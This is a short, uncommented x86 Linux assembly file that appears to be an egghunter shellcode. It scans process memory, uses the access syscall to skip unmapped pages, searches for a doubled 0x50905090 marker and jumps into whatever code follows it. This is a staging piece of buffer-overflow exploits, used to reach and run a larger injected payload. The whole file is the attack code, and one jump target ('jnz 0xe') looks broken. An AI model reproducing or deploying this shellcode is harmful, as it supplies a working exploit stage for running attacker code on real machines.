global _start
section .text
_start:

mov ebx,0x50905090
xor ecx,ecx
mul ecx
next_page:
or dx,0xfff
next_adress:
inc edx
pusha
lea ebx,[edx+0x4]
mov al,0x21
int 0x80
cmp al,0xf2
popa
jz next_page
cmp [edx],ebx
jnz next_adress 
cmp [edx+0x4],ebx
jnz 0xe
jmp edx
